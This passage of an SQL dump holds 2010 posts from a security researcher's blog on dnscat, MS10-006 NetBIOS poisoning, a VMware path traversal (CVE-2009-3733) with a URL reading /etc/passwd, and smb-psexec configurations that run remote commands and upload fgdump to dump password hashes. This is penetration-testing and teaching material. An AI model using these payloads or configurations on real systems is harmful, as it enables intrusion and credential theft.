client/server?\nYes for clients! Currently, I have my C implementation (built into dnscat), and my friend Stef wrote a Javascript implementation (included in the samples/ folder of the source install). If you want to implement a client in any other language, and you\'re ok with releasing it under dnscat\'s permissive license, I\'ll add it to the source tree! I went into gory detail about the dnscat protocol in the documentation. \nYou\'re also welcome to implement a server, but I don\'t know why you would. If you write a good, working, and compatible server in another language, I\'d be happy to add it to the tree!\nHow else can I help?\nThe best thing you can do right now is to help me test it and develop the use cases/documentation. Also, if you have experience developing Linux installers (.rpm, .deb, etc) and would like to help out, please let me know.', '\'DNS\', \'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2010/dns-backdoors-with-dnscat');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (80, 'Site changes', 'Ron Bowes', '2010-2-16', 'Hey all,\nJust a quick note -- I updated my blog template a bit. On the right, I added some new links and I added some info about myself at the top. I also added \"previous\" and \"next\" links above the posts. Hopefully these changes make it easier to get around. Let me know if I broke anything in the process! \nThat\'s all for today!\nRon', '\'Default\'', 'https://blog.skullsecurity.org/2010/site-changes');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (81, 'Watch out for evil SMB servers: MS10-006', 'Ron Bowes', '2010-2-14', 'Thanks to a Google Alert on my name, I recently found Laurent Gaffié\'s blog post about MS10-006 (Microsoft Technet link).\n\nI found this vulnerability interesting because this style is something I\'ve been thinking about for a couple years. We (in the industry) have done all kinds of work wringing every last bug out of server implementations, but how many people have really scrutinized client implementations (besides browsers, I mean). \nMS10-006 is a vulnerability in the SMB client that can be exploited by connecting to a malicious server. So how do you exploit something like that?\nWell, as Laurent mentioned, I wrote a tool awhile back called Nbtool (specifically, nbpoison or, in the upcoming release, nbsniff) that will intercept NetBIOS requests on the local network and respond with a chosen address. If the user is trying to access a local resource using NetBIOS name lookups, it becomes a race condition for the attacker. \nAnother likely avenue of attack I see is against so-called \"road warriors\", who bring their laptops to conferences, hotels, coffee shops, and other untrusted networks. If those laptops try accessing local resources, such as a file share, it will obviously fail (unless they\'re connected to their VPN already). But when the DNS (or WINS) lookup fails, they\'ll fall back to using broadcast NetBIOS lookups and me, with Nbtool ready, can send them a malicious address. And when they try connecting to my evil fileshare, I can send back my special MS10-006 exploit. Win!\nFor what it\'s worth, I was on a public network earlier this week and decided to see if sending NetBIOS responses pointing to me for all requests would provoke any 445 calls to my host -- it did. So this is definitely a possible vector. Now we just wait for the exploit!', '\'Hacking\', \'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2010/watch-out-for-evil-smb-servers-ms10-006');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (82, 'How-to: install an Nmap script', 'Ron Bowes', '2010-2-10', 'Hey all,\nI often find myself explaining to people how to install a script that isn\'t included in Nmap. Rather than write it over and over, this is a quick tutorial.\n\nStep 1: Figure out where your scripts are stored\nFirst, you have to find out where your scripts are installed. The easiest way to do that is to search your harddrive for *.nse files.\nWindows:\nWindows Key + F, *.nse\nLinux:\nfind / -name \'*.nse\'\r\nlocate *.nse\n\nThe common places are:\nc:\\Program Files\\Nmap\\Scripts\r\n/usr/share/nmap/scripts\r\n/usr/local/share/nmap/scripts\nWhile you\'re at it, in the same folder as \'scripts\', there should be another folder called \'nselib\', which contains files named *.lua. That\'s where libraries go.\nStep 2: Get the script + libraries\nUsually, I\'ll provide you with a link to the .nse file. All you have to do is download it and copy it into one of the directories above. If there are libraries to go with it (.lua files), copy them into the nselib folder.\nAlternatively, you might be able to download them from the Nmap site itself, typically in the scripts folder.\n\nStep 3: Update script database (optional)\nIf you want to run the script using a wildcard or category, you have to run Nmap\'s script update command:\n$ nmap --script-updatedb\nNote: if you\'re ok with giving the full name of the script, this isn\'t necessary.\nStep 4: Run it!\nThe last step is to run the script. Whether you are on the commandline or using Zenmap, the argument is the same: --script <scriptname>\n\nConclusion\nSo basically, you find the path where the scripts are stored, copy the script there, and run it. Simple!\nNow I can link back to this post whenever I write a new script. :)\nRon', '\'Nmap\'', 'https://blog.skullsecurity.org/2010/how-to-install-an-nmap-script-2');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (83, 'VM Stealing: The Nmap way (CVE-2009-3733 exploit)', 'Ron Bowes', '2010-2-10', 'Greetings! \nIf you were at Shmoocon this past weekend, you might remember a talk on Friday, done by Justin Morehouse and Tony Flick, on VMWare Guest Stealing. If you don\'t, you probably started drinking too early. :)\n\nAnyway, somebody in the audience asked if there was a Nessus or Nmap script to detect this vulnerability. If I was the kind to yell things out, I would have yelled \"there will be!\" -- and now, there is. It\'ll be included in the next full version of Nmap, but in the meantime here\'s how you can do it yourself. \nRequires: Nmap 5.10BETA1 or higher (download directory)\nScript: http://www.skullsecurity.org/blogdata/http-vmware-path-vuln.nse\nInstructions: http://www.skullsecurity.org/blog/?p=459\n\nDetails\nThis is a vulnerability in the VMWare management interface, which is a Web server. All you have to do is add a bunch of \"../\" sequences to the URL, and give it your chosen path, and it\'ll let you grab any file on the filesystem. I\'m not kidding, but I wish I was. You can even do the classic: https://x.x.x.x/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd\nThe applicable vulnerability identifiers are: CVE-2009-3733, VMSA-2009-0015. \nThe Nmap script simply downloads, parses, and displays the virtual machine inventory (assuming you\'re in verbose mode -- without verbose, it only prints \'VULNERABLE\'). The exploit released at Shmoocon will download the full vmware disk (vmdk) file, or you can do it yourself with your browser or wget. \nMitigation\nDO NOT let anybody have access to the VMWare management interface (the web server). It should be on a separate network. That makes this attack significantly more difficult to perform. \nOther than that, install the patches from the advisory. \nUPDATE: I forgot to mention the punchline: ESX/ESXi run the Web server as root. /etc/shadow is fair game!', '\'Nmap\'', 'https://blog.skullsecurity.org/2010/how-to-install-an-nmap-script');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (84, 'Why settle for (stealing) one password?', 'Ron Bowes', '2010-2-2', 'This is just a quick thought I had at work today -- actually, I had it in November, but just got around to posting it now. Common story, but eh?\n\nAnyway, I was having trouble logging into our issue-tracking solution today in November. It had been awhile since I\'d logged in, since I generally go through the Helpdesk to raise issues, so I wasn\'t sure exactly what I used for a password. So I tried my throwaway password I use for useless work stuff, but it didn\'t work. So I tried another throw away password, and another. No luck. Then I reset it and life moved on. \nMy point? If you\'re an attacker and want to collect passwords for internal systems, even if you only have hashes, replace the passwords and start logging requests. I\'ll bet people try the same password twice, then a couple others. Suddenly, you have a bunch of passwords to try on other systems. You might even get a couple varied usernames. \nOf course, that can be considered evil. But eh?', '\'Hacking\'', 'https://blog.skullsecurity.org/2010/why-settle-for-stealing-one-password');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (85, 'smb-psexec.nse: owning Windows, fast (Part 3)', 'Ron Bowes', '2010-1-19', 'Posts in this series (I\'ll add links as they\'re written):\n\nWhat does smb-psexec do?\nSample configurations (\"sample.lua\")\nDefault configuration (\"default.lua\")\nAdvanced configuration (\"pwdump.lua\" and \"backdoor.lua\")\n\n\nGetting started\nHopefully you all read the last two posts. I started with an introduction to smb-psexec.nse in the first post, then went over some \"example\" configurations in the second. The example configurations are nice to study because I designed them to be instructive, but today\'s post is going to look at some real configurations I\'m including. You\'ll notice that many are actually the same or very similar to the example configurations, and that\'s intentional. As of the Nmap 5.10beta1 and beta2 versions, these are included in default.lua.\nConfiguration files\nThe configuration file for smb-psexec.nse is stored in the nselib/data/psexec directory. Depending on which operating system you\'re on, and how you installed Nmap, it might be in one of the following places:\n\n/usr/share/nmap/nselib/data/psexec\n/usr/local/share/nmap/nselib/data/psexec\nC:\\Program Files\\Nmap\\nselib\\data\\psexec\n\nNote that up to and including Nmap 5.10BETA2, this folder will be missing on Windows. You\'ll need to download the Linux install and copy over the folder. \nNow, without further ado, let\'s take a look at the configurations, one at a time. \nCommand 1: Windows version\n\r\nmod = {}\r\nmod.upload           = false\r\nmod.name             = \"Windows version\"\r\nmod.program          = \"cmd.exe\"\r\nmod.args             = \"/c \\\"ver\\\"\"\r\nmod.maxtime          = 1\r\nmod.noblank          = true\r\ntable.insert(modules, mod)\r\n\nThis command displays the full version of Windows by running the \"ver\" command. \nInterestingly, this command wouldn\'t work when I tried running it directly. You\'ll see this theme running throughout my configuration files -- bugs where certain programs require certain variables to be set or certain environments that don\'t seem to make sense. I\'ve learned how to work around many of them, but be warned if you\'re writing configurations yourself: things may not always work as you expect. \nOutput on Windows 2000:\n|   Windows version\r\n|     Microsoft Windows 2000 [Version 5.00.2195]\r\n\nWindows Server 2003:\n|   Windows version\r\n|     Microsoft Windows [Version 5.2.3790]\r\n\nCommand 2: IP/MAC address\nmod = {}\r\nmod.upload           = false\r\nmod.name             = \"IP Address and MAC Address from \'ipconfig.exe\'\"\r\nmod.program          = \"ipconfig.exe\"\r\nmod.args             = \"/all\"\r\nmod.maxtime          = 1\r\nmod.find             = {\"IP Address\", \"Physical Address\", \"Ethernet adapter\"}\r\nmod.replace          = {{\"%. \", \"\"}, {\"-\", \":\"}, {\"Physical Address\", \"MAC Address\"}}\r\ntable.insert(modules, mod)\r\n\nI believe this one is either similar to or the same as the sample configuration from examples.lua, so I won\'t dwell on it. \nOutput:\n|   IP Address and MAC Address from \'ipconfig.exe\'\r\n|     Ethernet adapter Local Area Connection 2:\r\n|       MAC Address: 00:50:56:A1:24:C2\r\n|       IP Address: 10.0.0.30\r\n|     Ethernet adapter Local Area Connection:\r\n|       MAC Address: 00:50:56:A1:00:65\r\n\nCommands 3 and 4: List of users\nmod = {}\r\nmod.upload           = false\r\nmod.name             = \"User list from \'net user\'\"\r\nmod.program          = \"net.exe\"\r\nmod.args             = \"user\"\r\nmod.maxtime          = 1\r\nmod.remove           = {\"User accounts for\", \"The command completed\", \r\n                        \"%-%-%-%-%-%-%-%-%-%-%-\"}\r\nmod.noblank          = true\r\ntable.insert(modules, mod)\r\n\r\nmod.upload           = false\r\nmod.name             = \"Membership of \'administrators\' from \'net localgroup administrators\'\"\r\nmod.program          = \"net.exe\"\r\nmod.args             = \"localgroup administrators\"\r\nmod.maxtime          = 1\r\nmod.remove           = {\"The command completed\", \"%-%-%-%-%-%-%-%-%-%-%-\", \"Members\", \r\n                       \"Alias name\", \"Comment\"}\r\nmod.noblank          = true\r\ntable.insert(modules, mod)\r\n\nAs before, these commands were discussed previously. Strictly speaking, these aren\'t the most useful commands to run because identical information can be obtained from running smb-enum-users.nse and smb-enum-groups.nse.\nOutput:\n|   User list from \'net user\'\r\n|     Administrator            AKolmakov                Guest\r\n|     IUSR_RON-WIN2K-TEST      IWAM_RON-WIN2K-TEST      nmap\r\n|     rontest123               sshd                     SvcCOPSSH\r\n|     test1234                 Testing                  TsInternetUser\r\n|   Membership of \'administrators\' from \'net localgroup administrators\'\r\n|     Administrator\r\n|     SvcCOPSSH\r\n|     test1234\r\n|     Testing\r\n\nPing the scanner\nmod = {}\r\nmod.upload           = false\r\nmod.name             = \"Can the host ping our address?\"\r\nmod.program          = \"ping\"\r\nmod.args             = \"-n 1 $lhost\"\r\nmod.maxtime          = 5\r\nmod.remove           = {\"statistics\", \"Packet\", \"Approximate\", \"Minimum\"}\r\nmod.noblank          = true\r\nmod.env              = \"SystemRoot=c:\\\\WINDOWS\"\r\ntable.insert(modules, mod)\nAlthough this one was also discussed in the last post, I do want to bring up one noteworthy issue. It seems that many Windows programs that deal with IP addresses will fail in a spectacularily weird way. Here is the proper output\n|   Can the host ping our address?\r\n|     Pinging 10.0.0.138 with 32 bytes of data:\r\n|     Reply from 10.0.0.138: bytes=32 time<10ms TTL=64\r\n\nAnd here is the output without the environmental variable set:\n|   Can the host ping our address?\r\n|     Pinging $\\x98\\x07 with 32 bytes of data:\r\n|     Reply from 10.0.0.138: bytes=32 time<10ms TTL=64\r\n\nNotice how the ip got totally whacked. The outputted ip address, while consistent across multiple iterations, is completely wrong. tracert has the same problem. \nTracert to the scanner\nmod = {}\r\nmod.upload           = false\r\nmod.name             = \"Traceroute back to the scanner\"\r\nmod.program          = \"tracert\"\r\nmod.args             = \"-d -h 5 $lhost\"\r\nmod.maxtime          = 20\r\nmod.remove           = {\"Tracing route\", \"Trace complete\"}\r\nmod.noblank          = true\r\nmod.env              = \"SystemRoot=c:\\\\WINDOWS\"\r\ntable.insert(modules, mod)\r\n\nSpeaking of tracert, this command performs a traceroute from the target back to the scanner. This could be useful if you\'re trying to determine network layout or something, and you can\'t get a forward traceroute to work. Like ping, it requires the SystemRoot variable. \nOutput:\n\r\n|   Traceroute back to the scanner\r\n|       1    <1 ms    <1 ms    <1 ms  10.0.0.138\r\n\narp cache\nmod = {}\r\nmod.name             = \"ARP Cache from arp.exe\"\r\nmod.program          = \'arp.exe\'\r\nmod.upload           = false\r\nmod.args             = \'-a\'\r\nmod.remove           = \"Interface\"\r\nmod.noblank          = true\r\ntable.insert(modules, mod)\nThis one is easy -- dump the arp cache of the host using the \"arp -a\" command. No special options are required. \n|   ARP Cache from arp.exe\r\n|       Internet Address      Physical Address      Type\r\n|       10.0.0.138            00-50-56-a1-27-4b     dynamic\nConnected ports\nmod = {}\r\nmod.upload           = false\r\nmod.name             = \"List of listening and established connections (netstat -an)\"\r\nmod.program          = \"netstat\"\r\nmod.args             = \"-an\"\r\nmod.maxtime          = 1\r\nmod.remove           = {\"Active\"}\r\nmod.noblank          = true\r\nmod.env              = \"SystemRoot=c:\\\\WINDOWS\"\r\ntable.insert(modules, mod)\nDump the list of listening and established connections using \"netstat -an\". Like most other network-related configurations, this requires the SystemRoot variable to be set. \n|   List of listening and established connections (netstat -an)\r\n|       Proto  Local Address          Foreign Address        State\r\n|       TCP    0.0.0.0:22             0.0.0.0:0              LISTENING\r\n|       TCP    0.0.0.0:25             0.0.0.0:0              LISTENING\r\n|       TCP    0.0.0.0:80             0.0.0.0:0              LISTENING\r\n|       TCP    0.0.0.0:135            0.0.0.0:0              LISTENING\r\n|       TCP    0.0.0.0:443            0.0.0.0:0              LISTENING\r\n|       TCP    0.0.0.0:445            0.0.0.0:0              LISTENING\r\n|       TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING\r\n|       TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING\r\n|       TCP    0.0.0.0:1028           0.0.0.0:0              LISTENING\r\n|       TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING\r\n|       TCP    0.0.0.0:4933           0.0.0.0:0              LISTENING\r\n|       TCP    0.0.0.0:27453          0.0.0.0:0              LISTENING\r\n|       TCP    10.0.0.30:139          0.0.0.0:0              LISTENING\r\n|       TCP    10.0.0.30:445          10.0.0.138:34913       ESTABLISHED\r\n|       TCP    127.0.0.1:1030         127.0.0.1:40000        ESTABLISHED\r\n|       TCP    127.0.0.1:5152         0.0.0.0:0              LISTENING\r\n|       TCP    127.0.0.1:40000        0.0.0.0:0              LISTENING\r\n|       TCP    127.0.0.1:40000        127.0.0.1:1030         ESTABLISHED\r\n|       UDP    0.0.0.0:135            *:*\r\n|       UDP    0.0.0.0:445            *:*\r\n|       UDP    0.0.0.0:1029           *:*\r\n|       UDP    0.0.0.0:3456           *:*\r\n|       UDP    10.0.0.30:137          *:*\r\n|       UDP    10.0.0.30:138          *:*\r\n|       UDP    10.0.0.30:500          *:*\r\n|       UDP    10.0.0.30:4500         *:*\r\n|       UDP    127.0.0.1:1026         *:*\nRouting table\nmod = {}\r\nmod.upload           = false\r\nmod.name             = \"Full routing table from \'netstat -nr\'\"\r\nmod.program          = \"cmd.exe\"\r\nmod.args             = \"/c \\\"netstat -nr\\\"\"\r\nmod.env              = \"PATH=C:\\\\WINDOWS\\\\system32;C:\\\\WINDOWS;C:\\\\WINNT;C:\\\\WINNT\\\\system32\"\r\nmod.maxtime          = 1\r\nmod.noblank          = true\r\ntable.insert(modules, mod)\nDump the routing table using netstat -nr. This command has to be run in a separate command session (that\'s why we have cmd.exe /c \"netsat -nr\"). It also requires the PATH variable to contain the \'windows\' and \'system32\' folders -- I don\'t know why that is. \nOutput:\n|     IPv4 Route Table\r\n|     ===========================================================================\r\n|     Interface List\r\n|     0x1 ........................... MS TCP Loopback interface\r\n|     0x2 ...00 0b db 94 12 58 ...... Broadcom NetXtreme Gigabit Ethernet - Trend Micro Common Firewall Miniport\r\n|     0x10004 ...00 0b db 94 12 59 ...... Broadcom NetXtreme Gigabit Ethernet #2 - Trend Micro Common Firewall Miniport\r\n|     ===========================================================================\r\n|     ===========================================================================\r\n|     Active Routes:\r\n|     Network Destination        Netmask          Gateway       Interface  Metric\r\n|               0.0.0.0          0.0.0.0         10.0.0.1       10.0.0.250     20\r\n|              10.0.0.0    255.255.255.0       10.0.0.250       10.0.0.250     20\r\n|            10.0.0.250  255.255.255.255        127.0.0.1        127.0.0.1     20\r\n|        10.255.255.255  255.255.255.255       10.0.0.250       10.0.0.250     20\r\n|             127.0.0.0        255.0.0.0        127.0.0.1        127.0.0.1      1\r\n|             224.0.0.0        240.0.0.0       10.0.0.250       10.0.0.250     20\r\n|       255.255.255.255  255.255.255.255       10.0.0.250       10.0.0.250      1\r\n|       255.255.255.255  255.255.255.255       10.0.0.250            10004      1\r\n|     Default Gateway:          10.0.0.1\r\n|     ===========================================================================\r\n|     Persistent Routes:\r\n|       None\r\n\nBoot configuration\nmod = {}\r\nmod.upload           = false\r\nmod.name             = \"Boot configuration\"\r\nmod.program          = \"bootcfg\"\r\nmod.args             = \"/query\"\r\nmod.maxtime          = 5\r\ntable.insert(modules, mod)\r\n\nDisplays the boot configuration for the system. Only works on Windows XP or 2003 and above (not on Windows 2000). It\'ll tell you if you\'re on a system with multiple boot configurations, provided they\'re all Microsoft. \nOutput:\n|   Boot configuration\r\n|\r\n|     Boot Loader Settings\r\n|     --------------------\r\n|     timeout:30\r\n|     default:multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS\r\n|\r\n|     Boot Entries\r\n|     ------------\r\n|     Boot entry ID:    1\r\n|     OS Friendly Name: Windows Server 2003, Standard\r\n|     Path:             multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS\r\n|     OS Load Options:  /fastdetect /NoExecute=OptOut\r\n\nDrive details\nmod = {}\r\nmod.upload           = false\r\nmod.name             = \"Drive list (for more info, try adding --script-args=config=drives,drive=C:)\"\r\nmod.program          = \"fsutil\"\r\nmod.args             = \"fsinfo drives\"\r\nmod.replace          = {{string.char(0), \" \"}}\r\nmod.maxtime          = 1\nFinally, this is probably the simplest script, in terms of output. It simply prints a list of the known drive letters on the system. The trick to this one, though, is that for some insane reason the spaces in the output are actually NULL characters (\'\\0\'). Originally, only one drive was showing up. After troubleshooting it for awhile and finding the issue, I added the mod.replace line and everything worked find. It just goes to show that some developers are just plain insane.\nOutput:\n|   Drive list (for more info, try adding --script-args=config=drives,drive=C:)\r\n|     Drives:\r\n|     A:\\ C:\\ D:\\ F:\\\nConclusion\nSo there you have it, my default configuration file on smb-psexec.nse. I tried to balance the output between speed, size, and usefulness of information, and I hope you agree that the information is valuable. \nI\'m always happy to change the defaults, though, if you have some better ideas/options/whatever. \nSee you at Shmoocon!\nRon', '\'Hacking\', \'NetBIOS/SMB\', \'Nmap\'', 'https://blog.skullsecurity.org/2010/smb-psexec-nse-owning-windows-fast-part-3');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (86, 'Who’s going to Shmoocon?', 'Ron Bowes', '2010-1-18', 'Hey everybody,\nI\'m heading to Shmoocon on Feb 4 - 8, so two things:\na) Who wants to meet up? I have plans on the Saturday, but not much else yet. \nb) Please don\'t hack me while I\'m gone. ;)', '\'Conferences\'', 'https://blog.skullsecurity.org/2010/whos-going-to-shmoocon');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (87, 'smb-psexec.nse: owning Windows, fast (Part 2)', 'Ron Bowes', '2009-12-21', 'Posts in this series (I\'ll add links as they\'re written):\n\nWhat does smb-psexec do?\nSample configurations (\"sample.lua\")\nDefault configuration (\"default.lua\")\nAdvanced configuration (\"pwdump.lua\" and \"backdoor.lua\")\n\n\nGetting started\nHopefully you all read last week\'s post. It\'s a good introduction on what you need to know about smb-psexec.nse before using it, but I realize it\'s a little dry in terms of things you can do. I\'m hoping to change that this week, though, as I\'ll be going over a bunch of sample configurations. \nFor what it\'s worth, this information is lifted, though heavily modified, from the NSEDoc for the script. \nConfiguration files\nThe configuration file for smb-psexec.nse is stored in the nselib/data/psexec directory. Depending on which operating system you\'re on, and how you install Nmap, it might be in one of the following places:\n\n/usr/share/nmap/nselib/data/psexec\n/usr/local/share/nmap/nselib/data/psexec\nC:\\Program Files\\Nmap\\nselib\\data\\psexec\n\nNote that up to and including Nmap 5.10BETA1, this folder will be missing on Windows. You\'ll need to download the Linux install and extract the \'psexec\' folder. \nThe configuration file is mostly a module list. Each module is a program to run, and it\'s defined by a Lua table. It has, for example, the executable to run and the arguments to pass to it. There are all kinds of options, but it\'s probably easiest just to look at an example (note: all examples can be found in examples.lua, which is included with Nmap). \nTo test this stuff out, copy one of the built-in configuration files (such as example.lua), edit it, and run it with:\nnmap -p139,445 -d --script=smb-psexec \r\n    --script-args=smbuser=<username>,smbpass=<password>,config=<yourfilename> <target>\nFor example:\nnmap -p139,445 -d --script=smb-psexec \r\n    --script-args=smbuser=ron,smbpass=nor,config=experimental 10.0.0.123\nExample 1: Getting started\n\r\n  mod = {}\r\n  mod.upload           = false\r\n  mod.name             = \"Example 1: Membership of \'administrators\'\"\r\n  mod.program          = \"net.exe\"\r\n  mod.args             = \"localgroup administrators\"\r\n  table.insert(modules, mod)\r\n\nLet\'s take a closer look at the fields. \nmod.upload is false, indicating that the program is already present on the remote system. Since the program is \'net.exe\', it\'s installed by default on Windows and, obviously, doesn\'t have to be uploaded. \nmod.name is simply used as part of the output.\nmod.program and mod.args obviously define which program to run and the arguments to run it with. In this case, we\'re running \"net localgroup administrators\", which displays the list of administrators on the remote system. The output for this script is this:\n\r\n  |  Example 1: Membership of \'administrators\'\r\n  |  | Alias name     administrators\r\n  |  | Comment        Administrators have complete and unrestricted access to the\r\ncomputer/domain\r\n  |  | \r\n  |  | Members\r\n  |  | \r\n  |  | -------------------------------------------------------------------------------\r\n  |  | Administrator\r\n  |  | ron\r\n  |  | test\r\n  |  | The command completed successfully.\r\n  |  | \r\n  |  |_\r\n\nThat works, but it\'s pretty ugly. If you\'re scanning a lot of systems, you\'re going to end up with a lot of empty lines and other junk that you just don\'t need. \nExample 2: Cleaning it up\nBut, there\'s a solution! We can use some other fields to clean up the output, including:\n\nmod.find -- Like \'grep\', only lines that match the given pattern will be displayed.\nmod.remove -- The opposite of \'find\'; any lines containing the pattern are not displayed.\nmod.replace -- A typical match/replace.\nmod.noblank -- Remove blank lines.\n\nA couple things worth noting here. This cleanup is done on the client, after the data has been returned from the server. So, if you\'re worried about a password field crossing the wire, or your output is thousands of lines, this isn\'t going to speed anything up. Additionally, the patterns are Lua patterns. \nSo let\'s apply a few of these fields to our previous output:\n\r\n  mod = {}\r\n  mod.upload           = false\r\n  mod.name             = \"Example 2: Membership of \'administrators\', cleaned\"\r\n  mod.program          = \"net.exe\"\r\n  mod.args             = \"localgroup administrators\"\r\n  mod.remove           = {\"The command completed\", \"%-%-%-%-%-%-%-%-%-%-%-\", \"Members\", \r\n                                 \"Alias name\", \"Comment\"}\r\n  mod.noblank          = true\r\n  table.insert(modules, mod)\r\n\nNow we\'re using mod.remove to remove some of the crap, as well as mod.noblank to remove the blank lines.\nWe can see that the output is now much cleaner:\n\r\n  |  Example 2: Membership of \'administrators\', cleaned\r\n  |  | Administrator\r\n  |  | ron\r\n  |  |_test\r\n\nExample 3: Find/replace\nFor our next command, we\'re going to run ipconfig.exe, which outputs a significant amount of information. Let\'s say that all we want is the IP address and MAC address. Let\'s look at how to do it. \n\r\n  mod = {}\r\n  mod.upload           = false\r\n  mod.name             = \"Example 3: IP Address and MAC Address\"\r\n  mod.program          = \"ipconfig.exe\"\r\n  mod.args             = \"/all\"\r\n  mod.maxtime          = 1\r\n  mod.find             = {\"IP Address\", \"Physical Address\", \"Ethernet adapter\"}\r\n  mod.replace          = {{\"%. \", \"\"}, {\"-\", \":\"}, {\"Physical Address\", \"MAC Address\"}}\r\n  table.insert(modules, mod)\r\n\nGo ahead and type ipconfig /all to see what it looks like; I\'ll wait right here. \nThis time, we use the mod.find to list the lines we want. Obviously, we\'re looking for three patterns: \"IP Address\", \"Physical Address\", and \"Ethernet adapter\". Then, we use mod.replace to replace \". \" with nothing, \"-\" with \":\", and \"Physical Address\" with \"MAC Address\" (arguably unnecessary). Here\'s the final output:\n\r\n  |  Example 3: IP Address and MAC Address\r\n  |  | Ethernet adapter Local Area Connection:\r\n  |  |    MAC Address: 00:0C:29:12:E6:DB\r\n  |  |_   IP Address: 192.168.1.21\r\n\nExample 4 and 5: Variables\nNext topic: variables!\nVariables can be used in any field in the configuration file, such as find/replace, arguments, program name, etc. There are two types of variables: built-in and user-supplied. \nBuilt-in variables are set by the script. There are tons of them available, ranging in usefulness. Here are a bunch of them (I tried to put the more useful ones at the top):\n\n$lhost: The address of the scanner\n$rhost: The address being scanned\n$path: The path to which the scripts were uploaded (eg, \"C:\\WINDOWS\")\n$share: The share where the script was uploaded (eg, \"\\\\ADMIN$\")\n$lport: local port (meaningless; it\'ll change by the time the module is uploaded since multiple connections are made).\n$rport: remote port (likely going to be 445 or 139).\n$lmac: local mac address as a string in the xx:xx:xx:xx:xx:xx format (note: only set if the Nmap is running as root).\n$service_name: the name of the service that is running this program\n$service_file: the name of the executable file for the service\n$temp_output_file: The (ciphered) file where the programs\' output will be written before being renamed to $output_file\n$output_file: The final name of the (ciphered) output file. When this file appears, the script downloads it and stops the service\n$timeout: The total amount of time the script is going to run before it gives up and stops the process\n\nUser-supplied variables are provided on the commandline (in the --script-args argument) by the user when he or she runs the program. For example, to set the $test variable to 123, the user would pass --script-args=123. The required variables are controlled by the mod.req_args field in the configuration file, so to make $test a required field, you\'d add mod.req_args to \"test\".\nHere is a module that pings the local ip address, $lhost, which is a built-in variable:\n\r\n  mod = {}\r\n  mod.upload           = false\r\n  mod.name             = \"Example 4: Can the host ping our address?\"\r\n  mod.program          = \"ping.exe\"\r\n  mod.args             = \"$lhost\"\r\n  mod.remove           = {\"statistics\", \"Packet\", \"Approximate\", \"Minimum\"}\r\n  mod.noblank          = true\r\n  mod.env              = \"SystemRoot=c:\\\\WINDOWS\" \r\n  table.insert(modules, mod)\r\n\nAnd the output:\n\r\n  |  Example 4: Can the host ping our address?\r\n  |  | Pinging 192.168.1.100 with 32 bytes of data:\r\n  |  | Reply from 192.168.1.100: bytes=32 time<1ms TTL=64\r\n  |  | Reply from 192.168.1.100: bytes=32 time<1ms TTL=64\r\n  |  | Reply from 192.168.1.100: bytes=32 time<1ms TTL=64\r\n  |  |_Reply from 192.168.1.100: bytes=32 time<1ms TTL=64\r\n\nAnd this module pings an arbitrary address that the user is expected to give, $host:\n\r\n mod = {}\r\n mod.upload           = false\r\n mod.name             = \"Example 5: Can the host ping $host?\"\r\n mod.program          = \"ping.exe\"\r\n mod.args             = \"$host\"\r\n mod.remove           = {\"statistics\", \"Packet\", \"Approximate\", \"Minimum\"}\r\n mod.noblank          = true\r\n mod.env              = \"SystemRoot=c:\\\\WINDOWS\"\r\n mod.req_args         = {\'host\'}\r\n table.insert(modules, mod)\r\n\nAnd the output:\n$ ./nmap -n -d -p445 --script=smb-psexec --script-args=smbuser=test,smbpass=test,config=examples,host=1.2.3.4 192.168.1.21\n\r\n |  Example 5: Can the host ping 1.2.3.4?\r\n |  | Pinging 1.2.3.4 with 32 bytes of data:\r\n |  | Request timed out.\r\n |  | Request timed out.\r\n |  | Request timed out.\r\n |  |_Request timed out.\r\n\nExample 6: Uploading\nFor the final example, we\'ll use the \'upload\' setting to upload the \"fgdump.exe\", run it, download its output file, and clean up its logfile. You\'ll have to put fgdump.exe in the same folder as the script for this to work:\n\r\n  mod = {}\r\n  mod.upload           = true\r\n  mod.name             = \"Example 6: FgDump\"\r\n  mod.program          = \"fgdump.exe\"\r\n  mod.args             = \"-c -l fgdump.log\"\r\n  mod.url              = \"http://www.foofus.net/fizzgig/fgdump/\"\r\n  mod.tempfiles        = {\"fgdump.log\"}\r\n  mod.outfile          = \"127.0.0.1.pwdump\"\r\n  table.insert(modules, mod)\r\n\nThe -l argument for fgdump (in mod.args) supplies the name of the logfile. That file is listed in the mod.tempfiles field. What, exactly, does mod.tempfiles do? It simply gives Nmap a list of files to delete after the program runs. It\'s good for deleting logfiles other other artifacts your programs leave. \nmod.url is displayed to the user in an error message if mod.program isn\'t found in Nmap\'s data directory. And finally, mod.outfile is the file that is downloaded from the system, since fgdump.exe doesn\'t print to stdout (pwdump6, for example, doesn\'t require mod.outfile).\nFields in \'mod\'\nThe following is a list of all possible fields in the \'mod\' variable:\n\nupload (boolean) true if it\'s a local file to upload, false if it\'s already on the host machine. If upload is true, program has to be in nselib/data/psexec.\nname (string) The name to display above the output. If this isn\'t given, program .. args are used.\nprogram (string) If upload is false, the name (fully qualified or relative) of the program on the remote system; if upload is true, the name of the local file that will be uploaded (stored in nselib/data/psexec).\nargs (string) Arguments to pass to the process.\nenv (string) Environmental variables to pass to the process, as name=value pairs, delimited, per Microosft\'s spec, by NULL characters (string.char(0)).\nmaxtime (integer) The approximate amount of time to wait for this process to complete. The total timeout for the script before it gives up waiting for a response is the total of all \'maxtime\' fields.\nextrafiles (string[]) Extra file(s) to upload before running the program. These will not be renamed (because, presumably, if they are 